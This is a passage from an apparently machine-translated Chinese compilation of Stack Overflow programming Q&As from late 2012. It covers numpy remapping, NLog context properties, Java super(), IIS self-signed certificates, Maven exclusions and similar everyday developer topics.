> 时间：2012-11-26T20:29:01.740

可以像这样重新映射整个数组，而不是一个一个地替换值：

```
import numpy as np
a = np.array([1,2,2,1]).reshape(2,2)
# palette must be given in sorted order
palette = [1, 2]
# key gives the new values you wish palette to be mapped to.
key = np.array([0, 10])
index = np.digitize(a.ravel(), palette, right=True)
print(key[index].reshape(a.shape)) 
```

产量

```
[[ 0 10]
 [10  0]] 
```

* * *

[上述想法归功于@JoshAdel](https://stackoverflow.com/a/5036900/190597)。它比我原来的答案要快得多：

```
import numpy as np
import random
palette = np.arange(8)
key = palette**2
a = np.array([random.choice(palette) for i in range(514*504)]).reshape(514,504)

def using_unique():
    palette, index = np.unique(a, return_inverse=True)
    return key[index].reshape(a.shape)

def using_digitize():
    index = np.digitize(a.ravel(), palette, right=True)
    return key[index].reshape(a.shape)

if __name__ == '__main__':
    assert np.allclose(using_unique(), using_digitize()) 
```

我以这种方式对这两个版本进行了基准测试：

```
In [107]: %timeit using_unique()
10 loops, best of 3: 35.6 ms per loop
In [112]: %timeit using_digitize()
100 loops, best of 3: 5.14 ms per loop 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-01-12T14:44:32.597

我找到了另一个使用 numpy 函数的解决方案`place`。[（这里的](https://docs.scipy.org/doc/numpy/reference/generated/numpy.place.html)文档）

在您的示例中使用它：

```
>>> a = np.array([1,2,2,1]).reshape(2,2)
>>> a
array([[1, 2],
   [2, 1]])
>>> np.place(a, a==1, 0)
>>> np.place(a, a==2, 10)
>>> a
array([[ 0, 10],
       [10,  0]]) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-11-29T19:55:19.493

您还可以使用`np.choose(idx, vals)`, where`idx`是一个索引数组，指示`vals`应该将哪个值放在它们的位置。但是，索引必须从 0 开始。还要确保它`idx`具有整数数据类型。所以你只需要这样做：

```
np.choose(a.astype(np.int32) - 1, b) 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-02-07T14:16:19.057

我无法设置标志或使用掩码来修改值。最后，我只是复制了数组。

```
a2 = np.copy(a) 
```

# ruby-on-rails - 返回一组半唯一的最新记录

> ID：13572452
> 
> 赞同：1
> 
> 时间：2012-11-26T20:17:20.347
> 
> 标签：ruby-on-rails, activerecord

在我的应用程序中，用户有亮点。

每个 Highlight 都有一个 HighlightType。因此，如果我运行，`user.highlights`我可能会看到如下输出：

![user.highlights 示例](../Images/d511602b3aa65053154ee80ebeb85cc5.png)

请注意，type_id 47 有很多亮点。这标志着用户跑步次数的里程碑。

我想要做的是返回这个完整的记录列表，但每个 highlight_type 只包括一个突出显示，我希望那个记录是最近的记录（在这种情况下是“第 50 次运行”突出显示）。因此，在上面的示例中，我会得到相同的结果，但删除了 ID 195-199。

有没有一种有效的方法来实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T00:37:54.420

我认为没有一种简单或干净的方法可以实现这一目标，也没有“Rails 方式”。看看例如这个[链接](https://stackoverflow.com/questions/1313120/retrieving-the-last-record-in-each-group)

根据该[链接](https://stackoverflow.com/questions/1313120/retrieving-the-last-record-in-each-group)中的一项建议，您将执行此 SQL 请求：

```
SELECT h1.*
FROM highlights h1
LEFT JOIN highlights h2
 ON (h1.user_id = h2.user_id 
     AND h1.highlight_type_id = h2.highlight_type_id
     AND h1.created_at < h2.created_at)
WHERE h2.id IS NULL AND h1.user_id = <the user id you are interested in>
group by h1.highlight_type_id 
```

我认为如果你有大桌子可能会出现一些性能问题，我认为它不是很干净。

否则，如果用户没有太多亮点，我会做这样的事情：

```
rows = {}
user.highlights.order('highlight_type_id, created_at DESC').each do |hi|
  rows[hi.highlight_type_id] ||= hi
end
# then use rows which will have one object for each highlight_type_id 
```

on created_at`DESC`很重要

**编辑：** 我也看到了一些基于此的建议这 `user.highlights.group('highlight_type_id').order('created_at DESC')` 也是我最初认为应该解决的方法，但我对其进行了测试，但似乎没有得到正确的结果——至少在我的测试数据上是这样。

# android - 绘制水平线或垂直线时是否需要使用抗锯齿？

> ID：13572453
> 
> 赞同：0
> 
> 时间：2012-11-26T20:17:22.417
> 
> 标签：android, drawing

我认为抗锯齿仅在绘制圆形时才有用。它只会在绘制水平线或垂直线时变慢。所以，当我做 drawLine(...) 时，我不使用paint.setAntiAlias。我是对还是错？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:22:17.670

如果你不旋转这条线，那么 in 就没有用了`setAntiAlias`。

# python - 无论如何，python中有没有使用字典来计算音节？

> ID：13572454
> 
> 赞同：3
> 
> 时间：2012-11-26T20:17:29.547
> 
> 标签：python, nlp, nltk

CMUdict 适用于英语，但如果我想计算另一种语言内容的音节怎么办？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:23:18.387

这取决于语言。这听起来像是一个显而易见的答案，但这一切都归结为正字法的设计方式。在英语中，音节几乎与单词的书写方式无关，因此您需要一本字典。许多其他语言都是这样的。

不过，某些其他语言（如（南）韩语、日语平假名和片假名（但*不是*汉字））的书写方式使得字符本身显然与一个音节或特定数量的音节相匹配。在这种情况下，如果你知道这些语言是如何工作的，理论上你可以使用 Python 将文字分解成音节。

否则，您需要一本字典或其他一些可以处理此问题的编译平台。四处逛逛[`nltk`](http://nltk.org/)，看看你能找到什么。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:19:04.837

一般来说，没有。某些语言可能有，但如果您没有字典，则需要了解这些语言的语言结构。单词如何划分为音节因语言而异。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:52:41.283

您当然不能以通用方式对所有语言进行此操作，因为不同的语言将声音呈现为不同的文本。

例如，匈牙利语单词“vagy”对于说英语的人来说看起来像是两个音节，但实际上只有一个音节。英语单词“bike”自然会被许多其他语言的使用者读成两个音节。

此外，对于英语，如果没有字典，您可能无法非常准确地做到这一点，因为英语的拼写有很多奇怪的变化。例如，我们将“poet”中的“oe”发音为两个不同的音节，但“does”中只有一个音节。这可能也适用于其他一些语言。

# scripting - 从 Excel 内容创建 Word/PDF 文件

> ID：13572460
> 
> 赞同：0
> 
> 时间：2012-11-26T20:17:53.870
> 
> 标签：scripting, excel-2010

我有一个 Excel 文件，我想根据内容将其拆分为多个文件（Word、PDF 也可以）。内容有点像这样：

```
Person  Fase  Date       Item  Text
A       1     01-01-2012 Z     Lorem ipsum
A       2     01-02-2012 X     Lorem ipsum
B       1     02-01-2012 Y     Lorem ipsum
C       2     01-01-2012 Z     Lorem ipsum 
```

我想要名称如下的 Word/PDF 文档

```
Person_Fase.docx 
```

日期、项目和文本作为内容。理想的表格布局。关于如何到达那里的任何提示/线索？它大约有 700 个客户，每个客户最多有 300 个 Excel 条目。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:44:15.210

我过去使用的一个技巧是创建 HTML 文档，将制表符分隔文件替换为 HTML 表格。这个 HTML 文件可以被 MS Word 打开，*甚至*可以重命名为 .docx，即使它是 HTML。

另一种方法是使用 VBScript 并构建适当的 Office 文档。

[从http://msdn.microsoft.com/en-us/library/office/aa155477(v=office.10).aspx](http://msdn.microsoft.com/en-us/library/office/aa155477(v=office.10).aspx)下载 ofhtml9.exe以获取更多信息。有一些专有属性可用于格式化 Office 的 HTML 文件。

祝你好运！

# iphone - 在 cocos2d 中遍历层的子节点

> ID：13572461
> 
> 赞同：0
> 
> 时间：2012-11-26T20:17:55.257
> 
> 标签：iphone, objective-c, cocos2d-iphone

我正在尝试遍历并删除我的图层（HUDLayer）的所有子级。我正在尝试通过以下方式完成此任务：

```
 for(id *item in HUDLayer.children_)
    {
        [self removeChild:item cleanup:YES];
    } 
```

但我收到一个错误 -> 表达式没有有效的对象类型

有人可以阐明我的问题吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:20:58.853

```
for(id *item 
```

哎呀。`id`是一个对象本身（也是一个指针），不需要星号。

```
for(id item in HUDLayer._children) 
```

应该没事。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-26T09:12:52.643

在为另一个问题做了一些谷歌搜索后，才找到了这个。

您正在尝试从父级（HUDLayer）中删除对象。其他人已经回答了“自我”的问题。然而...

你说...

```
for(id *item in HUDLayer.children_) {
    [self removeChild:item cleanup:YES];
} 
```

...但我虽然我会添加下面的代码，因为我认为它可能会帮助其他人尝试删除子节点而不发生循环突变。

```
for(id item in HUDLayer.children) {
    // If it's a sprite that you want to remove
    if ([item isKindOfClass:[CCSprite class]]) {
        // Use this to remove or else you'll have a loop mutation.
        [item removeFromParentAndCleanup:YES];
    }
} 
```

无论如何，希望它可以帮助某人。

大声笑 - 现在编辑这个，因为我（估计）迭代并从中删除，甚至，父母可能会导致数组突变。所以，我正在修改上面的内容，首先将所有子元素放在一个数组中，然后我将遍历 IN REVERSE 并在此基础上删除对象。这样，避免了数组突变。见下文：

```
NSArray *items = [[NSArray alloc] initWithArray: HUDLayer.children];

for (long i = items.count - 1; i >= 0; i--) {
    id item = items[i];
    if ([item isKindOfClass:[CCSprite class]] ||
        [item removeFromParentAndCleanup:YES];
    }
}

items = nil; 
```

再次 - 希望它可以帮助某人。

# logging - 将变量作为前缀添加到所有 nLog 消息

> ID：13572462
> 
> 赞同：7
> 
> 时间：2012-11-26T20:17:56.493
> 
> 标签：logging, nlog

我正在使用 Nlog 来记录我的 Ninjatrader 策略。我希望能够将策略 ID 作为前缀添加到我的所有 nLog 消息中，以便我可以分别过滤与策略上的每个帐户相关的条目。

```
 fileTarget.Layout =  "${longdate} ${callsite} ${level} ${event-context:item=MyValue}  ${message}";` 
```

我目前的布局如上。我尝试使用 event-context:item 但不知道如何打印所有消息的上下文项。

我尝试如下

```
Logger log = LogManager.GetCurrentClassLogger();
LogEventInfo theEvent = new LogEventInfo(NLog.LogLevel.Debug, "", this.Account.Name);   
logger.Log(theEvent); 
```

但它只在第一行 Sim101 上打印了一行上下文信息，而不在其他行上打印。

```
2012-11-26 15:09:47.9777 NinjaTrader.Strategy.LODHOD.OnStartUp Debug   Sim101
2012-11-26 15:09:48.3996 NinjaTrader.Strategy.LODHOD.OnBarUpdate Trace   BAR UPDATE
2012-11-26 15:09:49.7902 NinjaTrader.Strategy.LODHOD.EntryOrders Info   PLACED ENTRY ORDERS 
```

如何在所有日志行上打印 Sim101？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-11-27T18:49:14.240

从对象的属性中`{event-context}` `LayoutRenderer`写入一个值。`LogEventInfo``Properties`

属性是一个字典，您可以在其中存储您希望 NLog 添加到每个日志消息的命名值。

如果您想使用记录消息时有效的“StrategyId”标记每条日志消息，您应该创建您的 LogEventInfo 对象，如下所示：

```
LogEventInfo theEvent = new LogEventInfo(NLog.LogLevel.Debug, "", this.Account.Name);
theEvent.Properties["StrategyId"] = "Sim101";
Logger.Log(theEvent); 
```

您的布局将如下所示：

```
fileTarget.Layout =  "${longdate} ${callsite} ${level} ${event-context:item=StrategyId}  ${message}"; 
```

如果您希望日志调用站点不那么冗长，可以使用 GlobalDiagnosticContext 或 MappedDiagnosticContext。

```
private void ApplyStrategyABC()
{
  NLog.GlobalDiagnosticContext.Set("StrategyId","ABC");
  //Do some stuff
  LogEventInfo theEvent = new LogEventInfo(NLog.LogLevel.Debug, "", this.Account.Name);
  Logger.Log(theEvent);

  NLog.GlobalDiagnosticContext.Remove("StrategyId");
}

private void ApplyStrategyDEF()
{
  NLog.GlobalDiagnosticContext.Set("StrategyId","DEF");
  //Do some stuff
  LogEventInfo theEvent = new LogEventInfo(NLog.LogLevel.Debug, "", this.Account.Name);
  Logger.Log(theEvent);

  NLog.GlobalDiagnosticContext.Remove("StrategyId");
} 
```

使用这样的布局：

```
fileTarget.Layout =  "${longdate} ${callsite} ${level} ${gdc:item=StrategyId}  ${message}"; 
```

将导致每条日志消息都被标记为全局字典中“StrategyId”的当前值。

为了好玩，您还可以制作一种流畅的 API 扩展方法，将您的属性应用于您创建的 LogEventInfo 对象。像这样的东西（未经测试）：

```
LogEventInfo WithProperty(this LogEventInfo theEvent, string name, string value)
{
  theEvent.Properties[name] = value;
  return theEvent;
} 
```

然后你可以像这样使用它：

```
var theEvent = new LogEventInfo(NLog.LogLevel.Debug, "", this.Account.Name).WithProperty("StrategyId", "ABC"); 
```

和这个：

```
var theEvent = new LogEventInfo(NLog.LogLevel.Debug, "", this.Account.Name).WithProperty("StrategyId", "ABC").WithProperty("SomethingElse", someLocalVariable); 
```

如果您想更明确（并减少可能的拼写错误），您可以制作更具体的扩展方法，如下所示：

```
LogEventInfo WithStrategy(this LogEventInfo theEvent, string strategy)
{
  theEvent.Properties["StrategyId"] = strategy;
  return theEvent;
}

LogEventInfo WithCurrency(this LogEventInfo theEvent, string currency)
{
  theEvent.Properties["Currency"] = currency;
  return theEvent;
}

var theEvent = new LogEventInfo(NLog.LogLevel.Debug, "", this.Account.Name).WithStrategy("ABC").WithCurrency("US dollars"); 
```

编辑：大多数人使用`Logger.Info`, `Logger.Debug`, `Logger.Trace`, 等方法来编写他们的日志消息，而不是为每条消息创建`LogEventInfo`并调用 Log。如果您`LogEventInfo`明确地创建对象，可能会有更大的灵活性，但它也会使您的工作更加复杂。

如果您想使用`Logger.Info`, `Logger.Debug`, etc 方法并使用附加属性装饰每条日志消息，您仍然可以这样做。

假设您有两种方法（如我上面描述的）来应用两种不同的策略：ABC 和 DEF：

使用这样的布局：

```
fileTarget.Layout =  "${longdate} ${callsite} ${level} ${gdc:item=StrategyId}  ${message}";

public class MyClass
{
  private static readonly Logger logger = LogManager.GetCurrentClassLogger();

  private void ApplyStrategyABC()
  {
    NLog.GlobalDiagnosticContext.Set("StrategyId","ABC");
    //Do some stuff

    logger.Debug("Hello from ABC!"); 

    var x = CalculateSomeValue();

    logger.Debug("Value = {0}", x);

    NLog.GlobalDiagnosticContext.Remove("StrategyId");      
  }

  private void ApplyStrategyDEF()
  {
    NLog.GlobalDiagnosticContext.Set("StrategyId","DEF");
    //Do some stuff

    logger.Debug("Hello from DEF");

    var x = CalculateSomeValue();

    logger.Debug("Value = {0}", x);

    NLog.GlobalDiagnosticContext.Remove("StrategyId");      
  }
}

In you program call your two strategies:

var myClass = new MyClass();

myClass.ApplyStrategyABC();
myClass.ApplyStrategyDEF(); 
```

在每种情况下，记录的消息都将使用在相应函数内部设置的“StrategyId”进行标记。

如果您确实想要创建和使用 LogEventInfo 对象来创建消息，那么您必须意识到一个 LogEventInfo 对象实例的属性仅适用于该实例。如果您创建一个 LogEventInfo，设置它的属性，记录它，然后使用 Logger.Info、Logger.Debug 等记录一条消息，那么您将看不到您在原始 LogEventInfo 上设置的属性。

例如，

```
var logger = LogManager.GetCurrentClassLogger();
var theEvent = new LogEventInfo(NLog.LogLevel.Debug, "", "Hello 1");
theEvent.Properties["StrategyId"] = "ABC";
//This message will be tagged with StrategyId = ABC if the layout uses the event-context LayoutRenderer
logger.Log(theEvent);

//This message will NOT be tagged with StrategyId = ABC because that value was only added to the LogEventInfo
//object that was created above.  Another way to think about this is that internally
//NLog creates a LogEventInfo for each message that is logged via the Debug, Trace, etc
//methods.
logger.Debug("Hello 2"); 
```

我建议使用`Logger.Info`, `Logger.Debug`, `Logger.Trace`, 等方法来记录您的消息，并使用`GlobalDiagnosticsContext`或`MappedDiagnosticsContext`指定您希望包含在每条日志消息中的附加信息。

一般来说，我认为我还建议您使用`Logger.Info`, `Logger.Debug`,`Logger.Trace`方法或`LogEventInfo`+ `Logger.Log`，但不要同时使用。两者都使用，尤其是当您尝试添加额外的上下文值 (StrategyId) 时可能会变得混乱。

我可以类比安装软件。通常，当您在计算机上安装软件时，您可以选择“典型”安装，让安装程序安装它要安装的组件，或者选择“自定义”，您可以选择要安装的组件。我不了解你，但我通常选择“典型”安装。使用`Logger.Info`, `Logger.Debug`,`Logger.Trace`就像“典型”安装。这些是最常用的日志记录方法。使用`LogEventInfo`+`Logger.Log`更像是选择“自定义”安装。如果您正在使用`LogEventInfo`，则意味着“典型”日志记录方法不能满足您的需求。

当您使用 NLog 时，您会更加熟悉它的工作原理，并且其中一些问题对您来说会变得更加明显。

请注意，这`GlobalDiagnosticsContext`是真正的全球性。它是一个静态对象。所以，如果你是多线程的，如果两个线程试图向字典中添加一个同名的值，你就有可能发生冲突。

`MappedDiagnosticsContext`是线程本地的（它使用线程静态字典来存储其值），因此在多线程情况下使用可能会更好。

如果您想花哨并自动限定您放入 GlobalDiagnosticsContext（或 MappedDiagnosticsContext）中的值，您可以创建一个像这样的类：

```
public class ScopedGlobalContext : IDisposable
{
  private string n;
  private string v;

  public ScopedGlobalContext(string name, string value)
  {
    n = name;
    v = value;
    NLog.GlobalDiagnosticsContext.Set(n, v);
  }

  public void Dispose()
  {
    NLog.GlobalDiagnosticsContext.Remove(n);
  }
} 
```

你可以像这样使用它：

```
 private void ApplyStrategyDEF()
  {
    using (new ScopedGlobalContext("StrategyId", "DEF"))
    {
      //Do some stuff

      logger.Debug("Hello from DEF");

      var x = CalculateSomeValue();

      logger.Debug("Value = {0}", x);
    }
  } 
```

这将在作用域开始`GlobalDiagnosticsContext`时将 StrategyId、DEF 名称值对放入字典中，并在作用域退出时将其删除。`using``using`

# java - 在没有超类的情况下调用 super()？

> ID：13572468
> 
> 赞同：8
> 
> 时间：2012-11-26T20:18:30.253
> 
> 标签：java, inheritance, constructor

当构造函数调用“super()”而没有除 Object 之外的任何超类时会发生什么（如果有的话）？像这样：

```
public class foo implements Serializable, Comparable {

  int[] startPoint;

  public foo() {

    super();

    startPoint = {5,9};
  }
} 
```

编辑：所以如果这什么都不做，为什么有人会在代码中明确地写出来？如果我只是删除那行会有什么不同吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-26T20:28:12.497

从任何构造函数中删除该行总是可以的`super();`，并且扩展类的构造函数没有什么特别的`Object`。空值超类构造函数的调用总是隐含的，所以无论你是否写下来，你总是得到完全相同的语义。

请注意，这意味着如果您省略了对执行大型操作（例如启动数据库连接或整个 GUI）的超类构造函数的调用，那么无论您是否实际编写`super();`.

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-26T20:20:17.863

`super()`是构造函数中的第一个调用，它是显式或隐式完成的。（当然，您可能需要更改参数以匹配父级的构造函数。）

你的代码：

```
public foo() 
{
    startPoint = {5,9};
} 
```

编译器从上面的代码中看到：

```
public foo()
 {
    super();
    startPoint = {5,9};
 } 
```

`super()`无论您是否将其明确地放在代码中，都会调用它。由于所有类都派生自`Object`类，因此您正在调用 Object 的构造函数，`super()`因为您的类没有任何中间父级。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-11-26T20:19:07.050

总是有一个超类被调用`Object`，所以它会调用构造函数`Object`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-26T20:20:02.237

这只是调用`Object()`构造函数，就像你有任何其他超类的构造函数没有参数一样。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-26T20:19:54.210

正如你所说，有一个超类（对象）。

将调用默认对象构造函数。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-26T20:20:56.030

它调用 Object 的构造函数，它是空的（什么都不做）。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-11-26T20:24:18.413

super() always call to the constructor to Object class if the class doesn't extends from one class.

> Class Object is the root of the class hierarchy. Every class has Object as a super class. All objects, including arrays, implement the methods of this class.

[Check this link](http://docs.oracle.com/javase/6/docs/api/java/lang/Object.html)

# ssas-2012 - 我需要在 SSAS Microsoft 表格模型上创建自定义日期格式以 dd-MMM-yyyy

> ID：13572471
> 
> 赞同：0
> 
> 时间：2012-11-26T20:18:39.267
> 
> 标签：ssas-2012

我正在尝试以in a`date`的格式自定义，它似乎不需要。`dd-MMM-yyyy``Microsoft tabular model`

`general`每次换 的时候好像又回来了。

有人可以帮我解决问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-08-05T22:49:14.040

我有同样的要求，并在网上找到了答案。您可以在日期表中创建计算列并使用格式函数。

以 AdventureWorksDW 数据库为例，您可以使用以下公式创建一个计算列：`=Format([FullDateAlternateKey], "dd-MMM-yyyy")`并在目标数据透视表中使用它

[取自微软论坛](https://social.msdn.microsoft.com/Forums/sqlserver/en-US/014caf8e-04ed-4959-810a-894181afccab/i-need-to-create-a-custom-date-format-in-microsoft-tabular-model-ssas-2012-vs2010-can-somone?forum=sqlanalysisservices)

# ssl - 自签名 SSL 证书 403.7 错误

> ID：13572472
> 
> 赞同：3
> 
> 时间：2012-11-26T20:18:39.460
> 
> 标签：ssl, windows-7, iis-7.5, pki

我已经有这个问题大约 2 周了。我做了很多研究并尝试了不同的方法，但没有任何乐趣。我的计算机（Windows 7 Pro）上有一个带有 sql server 2008 r2 并使用 IIS 7.5 的开发网站。有一个实际的开发服务器运行数据库和 Web 服务器，但由于我的位置，我无法使用主开发站点。我颁发了一个自签名的可信根证书：

```
makecert -r -pe -n "CN=ROOT AUTHORITY" -ss my -sr CurrentUser -a sha1 -sky signature -cy authority -sv ca.pvk ca.cer 
```

然后我将它安装到本地计算机上的受信任根目录中。之后，我创建了一个供 IIS 使用的证书。

```
makecert -pe -n "CN=example.website.name.com" -a sha1 -sky exchange -eku 1.3.6.1.5.5.7.3.1 -ic ca.cer -iv ca.pvk -sp "Microsoft RSA SChannel Cryptographic Provider" -sy 12 -sv server.pvk server.cer 
```

然后我为 IIS创建**.pfx文件**

```
pvk2pfx -pvk server.pvk -spc server.cer -pfx server.pfx 
```

在我完成上述操作后。我将证书导入 IIS，然后将网站绑定到 SSL 证书**(server.pfx)**

完成所有这些后，我访问网站[https://example.website.name.com](https://example.website.name.com)并获得 403.7 禁止。

有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-04-13T02:22:50.897

看看这些陷阱中的一些......

服务器问题 #1 - 传入的客户端证书具有 1 个或多个服务器上不存在的证书路径。打开证书转到证书路径（选项卡）并确保每个根颁发机构都在 SERVERS 受信任的根证书颁发机构中。请注意，您不需要在服务器上安装证书，只需在证书（本地计算机）\受信任的根证书颁发机构下的根颁发机构公钥。

服务器问题 #2（前面提到的解决方案） - 在 IIS 中，对于站点，确保 SSL 设置设置为接受或要求（从不忽略）。使用 Require 的好处是 IIS 日志将向您显示 403 7 错误，因为 Accept 只会让您的 IsPresent == false 但带有 200 http 代码。

客户端问题 #1 - 与服务器问题 #1 相同，必须信任这些权威！

客户端问题 #2 - 您拥有受信任的根授权，但没有证书本身的私钥。确保将 pfx（私钥）安装到证书存储中，而不是公钥 (.cer)。您还可以通过双击证书存储中的证书来查看您是否拥有私钥，在常规选项卡上，您应该会看到一条消息。

客户问题 #3 - 您将证书放在错误的位置。可能最好将您的证书放在证书（本地计算机）\个人\证书中，而不是（当前用户）。这将使证书可用于处理正在运行您的代码并实际需要访问它的帐户。

客户端问题 #4 - 右键单击​​证书（在商店中不是 .cer 文件）-> 所有任务 -> 管理私钥...并确保运行您的代码的进程帐户具有“读取”权限。对此的快速测试（但不建议用于生产用途）是将“所有人”添加为已读，以查看这是否是您的问题

# php - PHP 错误中的未定义索引

> ID：13572475
> 
> 赞同：1
> 
> 时间：2012-11-26T20:19:00.297
> 
> 标签：php

> **可能重复：**
> [PHP：“注意：未定义的变量”和“注意：未定义的索引”</a>](https://stackoverflow.com/questions/4261133/php-notice-undefined-variable-and-notice-undefined-index) [PHP 中未定义的索引](https://stackoverflow.com/questions/5676945/undefined-index-in-php)

> 注意：未定义的索引：第 107 行 C:\xampp\htdocs\pmsx\lib\config.php 中的 NAME

那是确切的错误。这是我在文件上的代码。谢谢你的帮助。

这是我的第 107 行：

```
//echo "<br>" . $cdata;
// create the proper tree node if NAME attribute is set
if ($this->attr["NAME"] != "")
    $this->tags[count($this->tags) - 1] = $this->attr["NAME"]; 
```

[粘贴链接](http://pastie.org/5439059)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:22:45.173

`NAME`不是定义的索引。你可能想要：

```
if( isset($this->attr['NAME']) && $this->attr['NAME'] != "" ) {
    // ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:22:54.910

您可能想要的是`!empty($this->attr['NAME'])`而不是`$this->attr["NAME"]!=""`. 否则，当 NAME 索引是……嗯……未定义时，它会出错。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:23:04.747

首先使用[isset()](http://php.net/isset)检查属性是否存在。

```
if ( isset( $this->attr["NAME"] ) && ($this->attr["NAME"] != "") ) {
    $this->tags[count($this->tags) - 1] = $this->attr["NAME"];
} 
```

您的错误说，该属性`NAME`在数组中根本不存在`attr`！

# ruby - sinatra + sinatra-authentication + mongoid：哪些版本？

> ID：13572486
> 
> 赞同：0
> 
> 时间：2012-11-26T20:19:33.530
> 
> 标签：ruby, mongodb, sinatra, mongoid

我正在使用 sinatra + mongoid 对 REST 服务进行原型设计。在寻找身份验证模块时，看起来 sinatra-authentication 正在满足我的要求。我的问题是我不能让所有这些东西一起工作。我可能一起使用了错误的版本集。

我在用着：

*   ruby 1.9.3（mongoid 3 需要）
*   mongoid 3.0.13
*   西纳特拉 1.3.3
*   来自 git master 的 sinatra-authentication 0.4.2（因为 0.4.1 不适用于 mongoid > 3 并且 0.4.2 不能用作 gem）
*   蒙戈 1.7.1

mongoid 配置正确，因为我可以查询 mongo 并获得结果，但是当我插入 sinatra-authentication 时，我得到了错误。

有谁知道哪些版本足够新并且恰好可以一起工作？

# jpql - 复杂的sql查询和JPQL

> ID：13572493
> 
> 赞同：2
> 
> 时间：2012-11-26T20:19:55.840
> 
> 标签：jpql

怎么把这个复杂的sql语句改成JPQL？

```
select a.name, a.surname, b.street, c.location, c.location_desc
from table1 join table2 on b.id = a.some_fk
left join table3 d on d.id = a.id
left join table4 c on c.some2_id = d.some2_fk where a.id = 400; 
```

如果这可以以 JPQL 形式呈现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:44:08.263

在不知道实体及其映射的情况下不可能给出明确的答案，但查询看起来像这样：

```
select a.name, a.surname, b.street, c.location, c.locationDesc
from Entity1 a 
join a.entity2 b
left join a.entity3 d 
left join d.entity4 c 
where a.id = 400; 
```

前提是实体之间存在必要的关联。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-26T13:19:55.983

JPQL 是面向对象的，它针对 JPA 实体对象而不是数据库表进行操作。您需要更改问题并添加 UML 图表或提供实体类。

# maven - 如何仅排除特定范围的依赖项？

> ID：13572502
> 
> 赞同：9
> 
> 时间：2012-11-26T20:20:25.687
> 
> 标签：maven, dependencies

我的 pom 中有两个依赖项，称为 A 和 B。A 和 B 都对工件 C（cassandra-all）具有传递依赖项。A 和 B 使用 C 的不同版本。依赖项 A 是工件*astyanax*。

我想保留B 附带的 C**版本**。我通过在 A (Astyanax) 中为 C 添加排除来完成。

不幸的是，我希望 B 的范围是“测试”。这意味着在 A 中排除，C 将不会包含在测试范围之外。

我该如何解决这个问题？排除项只能针对特定范围吗？或者，我可以指定用于传递依赖的版本吗？

* * *

**示例：**
这是我的 pom 的样子：

**工件 A (astyanax) 排除了对工件 C 的依赖（称为 cassandra-all）**

```
 <dependency>
        <groupId>com.netflix.astyanax</groupId>
        <artifactId>astyanax</artifactId>
        <version>1.0.4</version>
        <exclusions>
            <exclusion>
                <groupId>org.apache.cassandra</groupId>
                <artifactId>cassandra-all</artifactId>
            </exclusion>
        </exclusions>  
    </dependency>
    <dependency>
        <groupId>org.cassandraunit</groupId>
        <artifactId>cassandra-unit</artifactId>
        <version>1.1.1.1</version>
        <scope>test</scope>
    </dependency> 
```

所以具体来说：当我在测试范围之外运行代码并且仍然只保留 cassandraunit 测试的范围时，如何包含 cassandra-all？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-29T22:11:18.007

如果我的问题不够清楚，我深表歉意。我解决这个问题的方法一点也不难：

*   我在我的 pom 中为 C 添加了一个单独的依赖项
*   我在 A 中保留了 C 的排除

具体来说，我刚刚补充道：

```
 <dependency>
        <groupId>org.apache.cassandra</groupId>
        <artifactId>cassandra-all</artifactId>
        <version>1.1.5</version>
    </dependency> 
```

以及在运行时缺少的以下依赖项。

```
 <dependency>
        <groupId>commons-lang</groupId>
        <artifactId>commons-lang</artifactId>
        <version>2.6</version>
    </dependency> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-27T09:29:48.227

我不确定我是否理解所有内容，但无论如何，您应该能够通过配置文件来实现这一点。

在您的 pom 中，创建一个配置文件 A，在其中添加您的依赖项 A 并排除 B 和一个配置文件 B，您将在其中添加一个排除 A 的依赖项。

在运行时，根据您选择的配置文件，您将包含一个或另一个。

HIH

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-12-07T18:59:02.990

> 所以具体来说：当我在测试范围之外运行代码并且仍然只保留 cassandraunit 测试的范围时，如何包含 cassandra-all？

[使用 Maven POM 配置 surefire-maven-plugin](https://stackoverflow.com/a/12068045/1287376)并[更改您的 classpath](http://maven.apache.org/surefire/maven-surefire-plugin/examples/configuring-classpath.html)。

如果你想要的只是`cassandra-all`在运行测试时从类路径中删除依赖项，那么下面的 POM 片段会变得很棘手：

```
<build>
  <!-- ... -->

  <plugins>
    <!-- ... -->

    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-surefire-plugin</artifactId>
      <configuration>
        <classpathDependencyExcludes>
          <classpathDependencyExcludes>
            org.apache.cassandra:cassandra-all
          </classpathDependencyExcludes>
        </classpathDependencyExcludes>
      </configuration>
    </plugin>
  </plugins>
</build> 
```

# iphone - 从shoutcast iOS 编程中获取元数据

> ID：13572505
> 
> 赞同：4
> 
> 时间：2012-11-26T20:20:33.813
> 
> 标签：iphone, ios, metadata, shoutcast, webradio

